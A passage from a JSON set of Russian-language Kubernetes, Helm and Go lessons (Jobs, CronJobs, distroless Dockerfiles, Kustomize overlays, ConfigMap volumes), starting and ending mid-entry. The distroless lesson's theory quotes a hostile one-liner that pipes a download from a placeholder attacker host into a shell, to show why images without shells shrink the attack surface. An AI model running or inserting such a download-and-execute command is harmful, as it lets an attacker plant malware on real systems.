0).\n   - `hook-failed` — удалить при сбое.\n   - `before-hook-creation` — удалить старый Job перед созданием нового.",
    "step_by_step": "1. Создайте `templates/migration-job.yaml` с аннотацией хука `pre-install,pre-upgrade`.\n2. Укажите `hook-weight: \"1\"` и политику удаления `hook-succeeded,before-hook-creation`.\n3. Создайте `templates/cache-warm-job.yaml` с аннотацией `post-upgrade`.\n4. Напишите Go-приложение для миграций, завершающееся с кодом 0 при успехе.\n5. Протестируйте выполнение `helm upgrade`: убедитесь, что Pod приложения не обновляется, пока Job миграций не завершится успешно.",
    "code_blocks": [
      {
        "filename": "templates/migration-job.yaml",
        "lang": "yaml",
        "code": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: {{ .Release.Name }}-db-migrate\n  annotations:\n    \"helm.sh/hook\": pre-install,pre-upgrade\n    \"helm.sh/hook-weight\": \"1\"\n    \"helm.sh/hook-delete-policy\": before-hook-creation,hook-succeeded\nspec:\n  backoffLimit: 2\n  template:\n    spec:\n      restartPolicy: Never\n      containers:\n        - name: migrate\n          image: \"{{ .Values.image.repository }}:{{ .Values.image.tag }}\"\n          command: [\"/app/migrator\", \"up\"]\n          env:\n            - name: DB_URL\n              value: {{ .Values.database.url | quote }}"
      },
      {
        "filename": "templates/cache-warm-job.yaml",
        "lang": "yaml",
        "code": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: {{ .Release.Name }}-cache-warm\n  annotations:\n    \"helm.sh/hook\": post-upgrade\n    \"helm.sh/hook-weight\": \"5\"\n    \"helm.sh/hook-delete-policy\": hook-succeeded\nspec:\n  template:\n    spec:\n      restartPolicy: OnFailure\n      containers:\n        - name: warmer\n          image: curlimages/curl:latest\n          command: [\"curl\", \"-s\", \"http://{{ .Release.Name }}-svc:8080/warmup\"]"
      },
      {
        "filename": "migrator/main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tdbURL := os.Getenv(\"DB_URL\")\n\tif dbURL == \"\" {\n\t\tlog.Fatal(\"DB_URL не задан\")\n\t}\n\n\tfmt.Println(\"Применение SQL-миграций схемы базы данных...\")\n\ttime.Sleep(2 * time.Second) // Имитация применения миграций golang-migrate\n\tfmt.Println(\"Миграции успешно применены до версии v1.2.0\")\n}"
      }
    ],
    "under_the_hood": "Во время релиза Helm парсит все манифесты и отделяет объекты с аннотацией `\"helm.sh/hook\"` от обычных ресурсов. При наступлении фазы `pre-upgrade`:\n1. Helm отправляет манифест Job хука в `kube-apiserver`.\n2. Helm блокирует дальнейшее обновление кластера и начинает опрашивать статус Job (`kubectl wait --for=condition=complete`).\n3. Если Job завершился успешно (состояние `Complete`), Helm переходит к обновлению Deployment и Service.\n4. Если Job завершился с ошибкой (состояние `Failed`), Helm прерывает релиз, оставляя предыдущую версию работающей без изменений.",
    "pitfalls": "1. Отсутствие политики `before-hook-creation`: при повторном запуске `helm upgrade` Helm попытается создать Job с тем же именем, что вызовет ошибку `jobs.batch already exists`.\n2. Долгие миграции с блокировками таблиц: если Job миграций превышает дефолтный таймаут Helm (`--timeout 5m0s`), Helm признает релиз проваленным, хотя миграция в БД может продолжать выполняться.",
    "bigtech_interview": "**Вопрос с собеседования:** «Что произойдет со старыми подами приложения во время выполнения `pre-upgrade` хука в Helm?»\n**Ответ:** Старые поды предыдущей версии продолжают непрерывно работать и обслуживать трафик пользователей. Deployment новой версии еще не начал обновляться. Это накладывает фундаментальное архитектурное требование: миграции базы данных в хуках `pre-upgrade` обязаны быть **обратно совместимыми (Backward Compatible)**, то есть новая схема БД не должна ломать работу старого кода (паттерн Expand and Contract)."
  },
  {
    "num": 88,
    "title": "Периодические задачи: CronJob и управление политиками выполнения",
    "task": "Используйте **CronJob** для периодических задач (cleanup, backups, batch processing).",
    "theory": "**CronJob** управляет жизненным циклом разовых задач (**Job**) по расписанию cron (формат Vixie cron: `минута час день месяц день_недели`):\n1. **Ключевые параметры спецификации `spec`**:\n   - `schedule`: стандартное cron-выражение (например, `0 2 * * *` — каждую ночь в 02:00 UTC).\n   - `concurrencyPolicy`: поведение, если предыдущий Job еще не завершился к моменту наступления нового цикла:\n     - `Allow` (по умолчанию) — запускать параллельно.\n     - `Forbid` — пропускать новый запуск, пока работает предыдущий (критично для бэкапов и финансового биллинга!).\n     - `Replace` — отменить текущий незавершенный Job и запустить новый.\n   - `startingDeadlineSeconds`: максимальное окно опоздания (в секундах), в течение которого задача может быть запущена, если планировщик пропустил время старта.\n   - `successfulJobsHistoryLimit` / `failedJobsHistoryLimit`: количество сохраняемых завершенных объектов Job в истории (по умолчанию 3 и 1 соответственно) для экономии памяти `etcd`.",
    "step_by_step": "1. Создайте манифест `CronJob` с расписанием `*/10 * * * *` (каждые 10 минут).\n2. Задайте `concurrencyPolicy: Forbid` для защиты от параллельного исполнения.\n3. Ограничьте историю: `successfulJobsHistoryLimit: 3`.\n4. Напишите консольное Go-приложение, выполняющее очистку протухших сессий из хранилища.\n5. Проверьте создание Job командой `kubectl get cronjob` и просмотрите логи созданного пода.",
    "code_blocks": [
      {
        "filename": "cronjob.yaml",
        "lang": "yaml",
        "code": "apiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: session-cleanup\n  namespace: default\nspec:\n  schedule: \"*/10 * * * *\"\n  concurrencyPolicy: Forbid\n  startingDeadlineSeconds: 120\n  successfulJobsHistoryLimit: 3\n  failedJobsHistoryLimit: 1\n  jobTemplate:\n    spec:\n      backoffLimit: 2\n      activeDeadlineSeconds: 300\n      template:\n        spec:\n          restartPolicy: OnFailure\n          containers:\n            - name: cleaner\n              image: session-cleaner:v1.0.0\n              env:\n                - name: RETENTION_DAYS\n                  value: \"7"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"strconv\"\n\t\"time\"\n)\n\nfunc main() {\n\tretentionStr := os.Getenv(\"RETENTION_DAYS\")\n\tdays, err := strconv.Atoi(retentionStr)\n\tif err != nil || days <= 0 {\n\t\tdays = 7\n\t}\n\n\tlog.Printf(\"Запуск очистки сессий старше %d дней...\", days)\n\tstartTime := time.Now()\n\n\t// Имитация пакетного удаления записей из БД\n\tdeletedCount := 1420\n\ttime.Sleep(1500 * time.Millisecond)\n\n\tlog.Printf(\"Очистка успешно завершена за %v. Удалено устаревших сессий: %d\",\n\t\ttime.Since(startTime), deletedCount)\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Применение манифеста CronJob\nkubectl apply -f cronjob.yaml\n\n# Просмотр списка CronJobs и времени следующего запуска\nkubectl get cronjob\n\n# Ручной запуск Job из шаблона CronJob для немедленного тестирования\nkubectl create job --from=cronjob/session-cleanup manual-test-run\n\n# Просмотр логов выполненного пода\nkubectl logs -l job-name=manual-test-run"
      }
    ],
    "under_the_hood": "За запуск CronJob отвечает `cronjob-controller` внутри `kube-controller-manager`. Каждые 10 секунд контроллер опрашивает все CronJob, вычисляет время следующего запуска (`nextScheduleTime`) на основе локального времени контроллера. Когда наступает время, контроллер создает манифест `Job` со ссылкой `ownerReferences` на родительский `CronJob`. Затем уже `job-controller` создает один или несколько Pod'ов для фактического выполнения полезной нагрузки.",
    "pitfalls": "1. Дефолтное значение `concurrencyPolicy: Allow`: если долгая задача (например, бэкап 100 ГБ) выполняется 2 часа, а расписание задано каждый час, кластер запустит несколько параллельных копий бэкапа, что может вызвать перегрузку дисковой подсистемы и дедлоки в БД.\n2. Не задан `activeDeadlineSeconds`: зависший Job (например, повисший TCP-запрос) будет вечно висеть в кластере, занимая лимиты ресурсов и блокируя запуск новых задач при политике `Forbid`.",
    "bigtech_interview": "**Вопрос с собеседования:** «Что произойдет, если время в `kube-controller-manager` рассинхронизировано или контроллер был недоступен в течение 20 минут, когда должны были сработать запуски CronJob?»\n**Ответ:** При восстановлении контроллер проверит, сколько запусков было пропущено. Если пропущено более 100 запусков (или если прошло больше времени, чем задано в `startingDeadlineSeconds`), контроллер зарегистрирует ошибку и вообще НЕ запустит пропущенные задачи, чтобы не вызвать лавинообразную перегрузку системы (thundering herd problem). Задавая `startingDeadlineSeconds`, инженер контролирует допустимое окно наверстывания пропущенных задач."
  },
  {
    "num": 89,
    "title": "Безопасность контейнеров: сборка на базе Distroless-образов",
    "task": "**Использование Distroless-образов**: Напишите `Dockerfile`, финальный этап которого построен на базе минимального образа безопасности от Google: `gcr.io/distroless/static-debian12` [469]. Напишите комментарий со сравнением этого подхода с Alpine: почему отсутствие командной строки `sh`, утилит `curl`, `wget` и пакетных менеджеров в дистролесс-образах резко снижает площадь атаки (attack surface) вашей системы [469].",
    "theory": "Образы **Distroless** от Google содержат только само приложение и его непосредственные runtime-зависимости. В них нет:\n- Командных оболочек (`/bin/sh`, `/bin/bash`).\n- Пакетных менеджеров (`apk`, `apt`, `yum`).\n- Стандартных системных утилит Linux (`curl`, `wget`, `nc`, `tar`, `ls`, `cat`).\n**Сравнение с Alpine Linux:**\n- **Alpine:** Хотя базовый образ весит всего ~5 МБ, он содержит полноценный `busybox` (shell) и менеджер `apk`. Если злоумышленник находит RCE-уязвимость (Remote Code Execution) или Command Injection в веб-приложении, он может выполнить `sh -c \"curl attacker.com/malware | sh\"`, скачать бэкдор, исследовать файловую систему и смонтированные токены ServiceAccount.\n- **Distroless (`static-debian12:nonroot`):**\n  1. **Минимизация Attack Surface:** Даже получив возможность выполнить системный вызов `execve`, атакующий не найдет ни одной утилиты или shell для развития атаки (no living off the land).\n  2. **Отсутствие CVE:** Нет пакетов ОС — нет уязвимостей в базе сканеров (Trivy, Clair, Grype).\n  3. **Запуск от non-root:** Пользователь по умолчанию `nonroot:nonroot` (UID/GID 65532), что блокирует получение root-прав на ноде при побеге из контейнера.",
    "step_by_step": "1. Организуйте multi-stage Dockerfile: этап сборки на базе `golang:1.23-bookworm`.\n2. Скомпилируйте Go-бинарник со статическим линкованием (`CGO_ENABLED=0`).\n3. В финальном этапе переключитесь на `gcr.io/distroless/static-debian12:nonroot`.\n4. Скопируйте только бинарник и скомпилированные TLS-сертификаты.\n5. Проверьте сборку и убедитесь, что `docker exec -it <id> sh` завершается ошибкой из-за отсутствия shell.",
    "code_blocks": [
      {
        "filename": "Dockerfile",
        "lang": "dockerfile",
        "code": "# ==========================================\n# Этап 1: Сборка статического бинарника Go\n# ==========================================\nFROM golang:1.23-bookworm AS builder\n\nWORKDIR /build\n\nCOPY go.mod go.sum ./\nRUN go mod download\n\nCOPY . .\n\n# CGO_ENABLED=0 создает полностью самодостаточный статический ELF-бинарник\nRUN CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build \\\n    -ldflags=\"-w -s\" \\\n    -o /app/server .\n\n# ==========================================\n# Этап 2: Финальный защищенный runtime Distroless\n# gcr.io/distroless/static-debian12:nonroot\n# UID: 65532, GID: 65532\n# ==========================================\nFROM gcr.io/distroless/static-debian12:nonroot\n\nWORKDIR /app\n\n# Копируем только скомпилированный артефакт\nCOPY --from=builder /app/server /app/server\n\n# Экспонируем порт приложения\nEXPOSE 8080\n\n# Точка входа: запускается напрямую ядром Linux без shell-обертки\nENTRYPOINT [\"/app/server\"]"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"net/http\"\n\t\"os\"\n)\n\nfunc main() {\n\thttp.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n\t\tfmt.Fprintf(w, \"Безопасный Distroless Go Server. UID процесса: %d\\n\", os.Getuid())\n\t})\n\n\tlog.Println(\"Сервер запущен на :8080 в среде Distroless (nonroot)\")\n\tif err := http.ListenAndServe(\":8080\", nil); err != nil {\n\t\tlog.Fatalf(\"Ошибка: %v\", err)\n\t}\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Сборка образа\ndocker build -t secure-distroless-app:v1 .\n\n# Проверка размера образа (размер будет равен размеру Go бинарника + 2 МБ)\ndocker images secure-distroless-app:v1\n\n# Запуск контейнера\ndocker run -d -p 8080:8080 --name test-distroless secure-distroless-app:v1\n\n# Попытка войти в шелл контейнера завершится ошибкой!\ndocker exec -it test-distroless /bin/sh\n# OCI runtime exec failed: exec: \"/bin/sh\": stat /bin/sh: no such file or directory"
      }
    ],
    "under_the_hood": "В Linux запуск процессов без shell выполняется через системный вызов `execve(const char *filename, char *const argv[], char *const envp[])`. Ядро Linux открывает ELF-заголовок файла `/app/server`, мапит сегменты кода (`.text`) и данных (`.data`) в виртуальную память и передает управление точке входа `_start`. Поскольку CGO отключен, бинарник не требует динамического загрузчика (`/lib64/ld-linux-x86-64.so.2`) или системной библиотеки `glibc`. Образ содержит только корневые сертификаты `/etc/ssl/certs/ca-certificates.crt`, временную зону `/usr/share/zoneinfo` и записи в `/etc/passwd` для пользователя `nonroot`.",
    "pitfalls": "1. Забытый `CGO_ENABLED=0`: если Go скомпилирован со стандартным CGO (динамическая линковка с `glibc`), запуск в `distroless/static` завершится ошибкой `standard_init_linux.go: exec user process caused: no such file or directory` (так как динамический линковщик отсутствует).\n2. Трудности с отладкой: в контейнере нельзя выполнить `curl`, `netstat` или зайти через `sh`. Для отладки в K8s 1.25+ используют механизм **Ephemeral Debug Containers** (`kubectl debug -it <pod> --image=busybox --target=<container>`).",
    "bigtech_interview": "**Вопрос с собеседования:** «Как отладить упавший или зависший production-контейнер, если он собран на базе Distroless и в нем нет ни `sh`, ни утилит?»\n**Ответ:** 1) Использовать нативную возможность K8s — `kubectl debug pod-name -it --image=alpine --target=app-container --share-processes`. Это запускает временный контейнер с Alpine в том же Process Namespace (PID namespace), позволяя видеть процессы основного контейнера через `ps` и подключаться отладчиком; 2) Собрать метрики и логи через eBPF-зонды или sidecar-агенты без изменения базового контейнера."
  },
  {
    "num": 90,
    "title": "Kustomize: архитектура Base и Overlays для мульти-окружений",
    "task": "Напиши **Kustomize overlay**: `base/` (common resources), `overlays/dev/` (development patches), `overlays/prod/` (production patches: replicas, resources, TLS). `kustomization.yml` с `resources`, `patchesStrategicMerge`, `configMapGenerator`. Покажи `kubectl apply -k overlays/prod`.",
    "theory": "**Kustomize** — декларативный инструмент управления манифестами без шаблонизации, встроенный прямо в `kubectl` (`kubectl apply -k`):\n1. **Философия Template-Free:** в отличие от Helm, где манифесты превращаются в смесь YAML и шаблонных тегов `{{ .Values }}`, в Kustomize все файлы остаются 100% валидным YAML.\n2. **Архитектурный паттерн Base / Overlays:**\n   - `base/` — содержит базовые манифесты (`deployment.yaml`, `service.yaml`), общие для всех сред.\n   - `overlays/<env>/` — содержит патчи для конкретного окружения (`dev`, `staging`, `prod`).\n3. **Механизмы модификации:**\n   - `resources`: список манифестов или путей к базам.\n   - `patchesStrategicMerge` (или `patches`): наложение диффов на существующие ресурсы (изменение числа реплик, добавление ресурсов CPU/RAM).\n   - `configMapGenerator` / `secretGenerator`: генерация ConfigMap со случайным хэшем в имени (например, `app-config-g8h2k9`). При изменении файла Kustomize меняет имя ConfigMap, что автоматически триггерит Rolling Update в Deployment!\n   - `namePrefix` / `nameSuffix` / `namespace`: добавление префиксов/суффиксов ко всем создаваемым объектам.",
    "step_by_step": "1. Создайте директорию `base/` с базовым `deployment.yaml` и `kustomization.yaml`.\n2. Создайте `overlays/dev/` с патчем для 1 реплики и дев-конфигурацией.\n3. Создайте `overlays/prod/` с патчем для 5 реплик, повышенными лимитами ресурсов и TLS Ingress.\n4. Проверьте сгенерированный результат командой `kubectl kustomize overlays/prod`.\n5. Примените манифесты в кластер через `kubectl apply -k overlays/prod`.",
    "code_blocks": [
      {
        "filename": "base/kustomization.yaml",
        "lang": "yaml",
        "code": "apiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nresources:\n  - deployment.yaml\n  - service.yaml\n\nconfigMapGenerator:\n  - name: app-config\n    files:\n      - config.env"
      },
      {
        "filename": "base/deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: api-service\n  template:\n    metadata:\n      labels:\n        app: api-service\n    spec:\n      containers:\n        - name: app\n          image: my-company/api:v1.0.0\n          envFrom:\n            - configMapRef:\n                name: app-config"
      },
      {
        "filename": "overlays/prod/kustomization.yaml",
        "lang": "yaml",
        "code": "apiVersion: kustomize.config.k8s.io/v1\nkind: Kustomization\n\nresources:\n  - ../../base\n\nnamePrefix: prod-\n\npatchesStrategicMerge:\n  - replica_patch.yaml\n  - resources_patch.yaml"
      },
      {
        "filename": "overlays/prod/replica_patch.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-service\nspec:\n  replicas: 5"
      },
      {
        "filename": "overlays/prod/resources_patch.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api-service\nspec:\n  template:\n    spec:\n      containers:\n        - name: app\n          resources:\n            limits:\n              cpu: \"2\"\n              memory: 2Gi\n            requests:\n              cpu: 500m\n              memory: 512Mi"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Просмотр манифестов продакшена без применения\nkubectl kustomize overlays/prod\n\n# Применение продакшен-оверлея напрямую в кластер\nkubectl apply -k overlays/prod"
      }
    ],
    "under_the_hood": "Kustomize использует алгоритм **Strategic Merge Patch**, понимающий схему OpenAPI ресурсов Kubernetes. При объединении `Deployment` из `base` и `resources_patch.yaml` Kustomize находит контейнер с `name: app` благодаря специальной директиве `patchStrategy: merge` и `patchMergeKey: name` в спецификации Kubernetes. Вместо перезаписи всего массива контейнеров патчатся только указанные поля `resources.limits` и `resources.requests`.",
    "pitfalls": "1. Ошибки в именах объектов в файлах патчей: в манифесте патча `metadata.name` обязан точно совпадать с именем ресурса в `base` (до применения `namePrefix`), иначе Kustomize выбросит ошибку `no matches for Id`.\n2. Изменение обычного ConfigMap без `configMapGenerator`: изменение значений в ConfigMap не приводит к автоматическому перезапуску подов Deployment. Использование `configMapGenerator` добавляет SHA-1 хэш содержимого к имени (`app-config-7b2h8k`), что изменяет `spec.template.spec` пода и вызывает мгновенный Rolling Update.",
    "bigtech_interview": "**Вопрос с собеседования:** «Почему крупные компании (например, при использовании GitOps-инструментов вроде ArgoCD) часто предпочитают Kustomize вместо Helm для собственных микросервисов?»\n**Ответ:** Kustomize оставляет манифесты валидными YAML-файлами без необходимости отладки сложных циклов и условий Go-шаблонов. Это исключает синтаксические ошибки интерполяции строк, упрощает код-ревью в pull request'ах (в diff видны реальные изменения манифестов, а не `{{ .Values.foo }}`), поддерживается `kubectl` из коробки и идеально интегрируется с GitOps-контроллерами."
  },
  {
    "num": 91,
    "title": "Разовые пакетные задачи: Kubernetes Job и семантика перезапусков",
    "task": "Настройте **Job** для one-off задач (например, миграции БД при деплое).",
    "theory": "Объект **Job** предназначен для выполнения разовых вычислений или задач с четко определенным завершением (batch processing, миграции БД, генерация отчетов, обучение ML-моделей):\n1. **Отличие от Deployment:**\n   - Deployment рассчитан на долгоживущие процессы (серверы). Если процесс завершается (exit code 0), Deployment перезапускает его, считая это аварией.\n   - Job рассчитан на задачи, которые завершаются. Когда процесс завершается с кодом 0, Job переходит в статус `Completed` и больше не перезапускается.\n2. **Ключевые параметры спецификации `JobSpec`**:\n   - `restartPolicy`: для Pod внутри Job допустимы только `Never` (создать новый Pod при сбое) или `OnFailure` (перезапустить контейнер внутри существующего Pod). Значение `Always` запрещено!\n   - `backoffLimit`: максимальное количество повторных попыток перед тем, как признать Job завершившимся со сбоем (по умолчанию 6).\n   - `activeDeadlineSeconds`: жесткий лимит времени выполнения всей задачи (например, 600 сек). Если задача не завершилась, все поды принудительно убиваются.\n   - `ttlSecondsAfterFinished`: автоматическое удаление объекта Job и его подов из кластера через N секунд после завершения (очистка памяти etcd).",
    "step_by_step": "1. Создайте манифест `job.yaml` с `restartPolicy: OnFailure`.\n2. Установите `backoffLimit: 3` и `activeDeadlineSeconds: 300`.\n3. Настройте `ttlSecondsAfterFinished: 100` для автоматической сборки мусора.\n4. Напишите Go-утилиту, выполняющую миграцию таблиц и возвращающую код 0 при успехе.\n5. Запустите Job и отследите статус через `kubectl get job`.",
    "code_blocks": [
      {
        "filename": "job.yaml",
        "lang": "yaml",
        "code": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: db-schema-migration-v2\n  namespace: default\nspec:\n  backoffLimit: 3\n  activeDeadlineSeconds: 300\n  ttlSecondsAfterFinished: 60\n  template:\n    metadata:\n      name: db-migrator\n    spec:\n      restartPolicy: OnFailure\n      containers:\n        - name: migrator\n          image: db-migrator:v2.0.0\n          env:\n            - name: DATABASE_URL\n              value: \"postgres://user:pass@postgres:5432/app_db?sslmode=disable"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n\t\"time\"\n)\n\nfunc main() {\n\tdbURL := os.Getenv(\"DATABASE_URL\")\n\tif dbURL == \"\" {\n\t\tlog.Fatal(\"Переменная окружения DATABASE_URL не задана\")\n\t}\n\n\tlog.Println(\"Инициализация соединения с БД и блокировка таблицы миграций...\")\n\ttime.Sleep(1 * time.Second)\n\n\t// Имитация применения миграций схемы\n\tmigrations := []string{\"001_create_users\", \"002_add_index_email\", \"003_create_orders\"}\n\tfor _, m := range migrations {\n\t\tlog.Printf(\"Применение миграции: %s... УСПЕШНО\", m)\n\t}\n\n\tfmt.Println(\"Все миграции успешно завершены. Выход с кодом 0.\")\n\tos.Exit(0)\n}"
      },
      {
        "filename": "Терминал",
        "lang": "bash",
        "code": "# Запуск задачи\nkubectl apply -f job.yaml\n\n# Ожидание завершения выполнения Job\nkubectl wait --for=condition=complete --timeout=60s job/db-schema-migration-v2\n\n# Просмотр логов выполненного контейнера\nkubectl logs -l job-name=db-schema-migration-v2"
      }
    ],
    "under_the_hood": "`job-controller` отслеживает состояние подов задачи. Если контейнер завершается с ненулевым кодом выхода, контроллер увеличивает счетчик сбоев (`failedCount`) и вычисляет экспоненциальную задержку перед следующим запуском: $10 \\text{s} \\times 2^{\\text{failedCount}}$ (10с, 20с, 40с...). Когда `failedCount >= backoffLimit`, контроллер помечает Job условием `JobFailed` и прекращает создание новых подов. Контроллер `ttl-after-finished-controller` следит за полем `ttlSecondsAfterFinished` и отправляет вызов `Delete` в apiserver через указанное время.",
    "pitfalls": "1. Использование `restartPolicy: Always`: приведет к ошибке валидации манифеста apiserver при создании Job.\n2. Не установлен `ttlSecondsAfterFinished`: сотни старых завершенных объектов Job накапливаются в etcd, перегружая память apiserver и затрудняя вывод команд `kubectl get pods`.",
    "bigtech_interview": "**Вопрос с собеседования:** «В чем разница между `completions` и `parallelism` в Kubernetes Job?»\n**Ответ:** Параметр `completions: N` указывает общее количество успешных завершений Pod'ов, необходимых для того, чтобы весь Job считался завершенным (по умолчанию 1). Параметр `parallelism: M` определяет максимальное количество Pod'ов, которые могут выполняться одновременно параллельно (по умолчанию 1). Это позволяет организовать параллельную обработку очередей задач (Work Queues) силами встроенных примитивов K8s."
  },
  {
    "num": 92,
    "title": "Монтирование файлов: проекция ConfigMap как файла через Volumes",
    "task": "**Монтирование файлов (Volumes)**: Твоему приложению нужен файл `config.yaml`. Помести содержимое этого файла в ConfigMap. Настрой Deployment так, чтобы он примонтировал (Volume Mount) этот ConfigMap внутрь пода как реальный физический файл (например, в путь `/etc/config/config.yaml`).",
    "theory": "Передача конфигурации через переменные окружения удобна для простых строковых значений, но сложные приложения на Go часто используют структурированные конфигурационные файлы (`config.yaml`, `config.json`, `prometheus.yml`).\n1. **ConfigMap как Volume:**\n   - В `volumes` объявляется источник `configMap` с указанием `name: my-config`.\n   - В `volumeMounts` контейнера указывается `mountPath: /etc/config`.\n   - Каждый ключ из ConfigMap становится отдельным файлом в целевой директории, а значение ключа — содержимым файла.\n2. **Способы монтирования:**\n   - **Монтирование всей директории (`mountPath: /etc/config`):** заменяет всё содержимое директории файлами из ConfigMap.\n   - **Монтирование отдельного файла через `subPath`:** позволяет подложить один файл в существующую директорию (например, `/etc/nginx/nginx.conf`), не стирая другие файлы в ней. **Внимание:** файлы, смонтированные через `subPath`, НЕ обновляются автоматически при изменении ConfigMap!\n3. **Механизм обновления (Atomic Rotation):** При стандартном монтировании тома `kubelet` обновляет файлы при изменении ConfigMap с помощью переключения символических ссылок (`..data`), что исключает чтение частично записанного файла.",
    "step_by_step": "1. Создайте ConfigMap `app-config-file`, где ключ `config.yaml` содержит структурированный YAML.\n2. В `deployment.yaml` подключите том `config-volume` на базе ConfigMap.\n3. Примонтируйте том по пути `/etc/config`.\n4. В Go-приложении прочитайте и распарсите файл `/etc/config/config.yaml` с помощью библиотеки `gopkg.in/yaml.v3`.\n5. Протестируйте вывод конфигурации.",
    "code_blocks": [
      {
        "filename": "configmap.yaml",
        "lang": "yaml",
        "code": "apiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: app-config-file\n  namespace: default\ndata:\n  config.yaml: |\n    server:\n      port: 8080\n      timeout_seconds: 15\n    database:\n      host: \"postgres.internal\"\n      max_connections: 50\n    features:\n      enable_cache: true"
      },
      {
        "filename": "deployment.yaml",
        "lang": "yaml",
        "code": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: config-reader\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: config-reader\n  template:\n    metadata:\n      labels:\n        app: config-reader\n    spec:\n      containers:\n        - name: app\n          image: config-reader:v1.0.0\n          volumeMounts:\n            - name: config-volume\n              mountPath: /etc/config\n              readOnly: true\n      volumes:\n        - name: config-volume\n          configMap:\n            name: app-config-file"
      },
      {
        "filename": "main.go",
        "lang": "go",
        "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"log\"\n\t\"os\"\n)\n\nfunc main() {\n\tpath := \"/etc/config/config.yaml\"\n\tdata, err := os.ReadFile(path)\n\tif err != nil {\n\t\tlog.Fatalf(\"Ошибка чтения конфигурационного файла %s: %v\", path, err)\n\t}\n\n\tfmt.Printf(\"Файл конфигурации успешно прочитан из тома (%d байт):\\n%s\\n\",\n\t\tlen(data), string(data))\n}"
      }
    ],
    "under_the_hood": "`kubelet` монтирует ConfigMap с использованием символических ссылок. В директории `/etc/config` создается скрытая директория вида `..2026_09_04_...`, куда записываются реальные файлы. Создается симлинк `..data -> ..2026_09_04_...`, а файл `config.yaml` указывает на `..data/config.yaml`. Когда ConfigMap обновляется, kubelet записывает новую директорию и атомарно меняет симлинк `..data` через системный вызов `rename()`. Это предотвращает состояние гонки (data race), когда приложение считывает полузаписанный файл.",
    "pitfalls": "1. Использование `subPath`: смонтированный через `subPath` файл связывается через `mount --bind` напрямую с инодом (inode). При обновлении ConfigMap ядро Linux не обновляет инод bind-mount, и файл внутри контейнера остается старой версии вплоть до перезапуска пода.\n2. Перезапись системных директорий: монтирование ConfigMap в `/etc` затрет все системные файлы (`/etc/passwd`, `/etc/resolv.conf`), вызвав крах контейнера. Всегда монтируйте в изолированные подпапки (`/etc/config`, `/etc/myapp`).",
    "bigtech_interview": "**Вопрос с собеседования:** «Как в Go-приложении реализовать динамическую перезагрузку конфигурации (Hot Reload) без перезапуска Pod при изменении ConfigMap?»\n**Ответ:** Поскольку `kubelet` обновляет файлы в смонтированном томе ConfigMap с задержкой sync period (~60 сек), приложение на Go может отслеживать изменения с помощью библиотеки `fsnotify` (системный вызов Linux `inotify`). Важно слушать события создания и удаления симлинка `..data` в директории, перечитывать файл `config.yaml` и атомарно обновлять указатель на структуру конфигурации в памяти с помощью `atomic.Pointer` или `sync.RWMutex`."
  },
  {
    "num": 93,
    "title": "Основы Helm: создание чарта, структура директорий и первый релиз",
    "task": "**[Helm Basics]**: Создай Helm-чарт для своего приложения (`helm create myapp`). Изучи структуру (`templates/`, `values.yaml`). Задеплой через `helm install`.",
    "theory": "**Helm** — менеджер пакетов для Kubernetes (аналог `apt`/`dnf` в Linux или `npm` в Node.js).\nКоманда `helm create <chart-name>` создает стандартный каркас чарта:\n- **`Chart.yaml`** — манифест пакета: название, версия чарта (semver), версия приложения (`appVersion`), авторы.\n- **`values.yaml`** — конфигурация по умолчанию, передаваемая в шаблоны.\n- **`templates/`** — директория Go-шаблонов:\n  - `deployment.yaml` — шаблон Deployment.\n  - `service.yaml` — шаблон Service.\n  - `ingress.yaml` — шаблон Ingress (по умолчанию выключен).\n  - `hpa.yaml` — HorizontalPodAutoscaler.\n  - `_helpers.tpl` — именованные шаблоны и функции (вычисление полных имен, стандартных лейблов).\n  - `NOTES.txt` — текстовое сообщение, выводимое пользователю после установки чарта в консоль.\n- **`charts/`** — директория для хранения tar-архивов зависимостей (subcharts).\n- **`.helmignore`** — список файлов и паттернов, исключаемых при сборке пакета.",
    "step_by_step": "1. Выполните команду `helm create myapp`.\n2. Исследуйте сгенерированные файлы и директории.\n3. Отредактируйте `values.yaml`, указав свой образ и порт `8080`.\n4. Выполните пробный прогон рендеринга: `helm install --dry-run --debug my-release ./myapp`.\n5. Установите чарт в кластер: `helm install my-release ./myapp`.\n6. Проверьте статус релиза: `helm list` и `helm status my-release`.",
    "code_blocks": [
      {
        "filename": "Chart.yaml",
        "lang": "yaml",
        "code": "apiVersion: v2\nname: myapp\ndescription: Учебный Helm-чарт для демонстрации базовой структуры\ntype: application\nversion: 0.1.0\nappVersion: \"1.0.0"
      },
      {
        "filename": "templates/_helpers.tpl",
        "lang": "yaml",
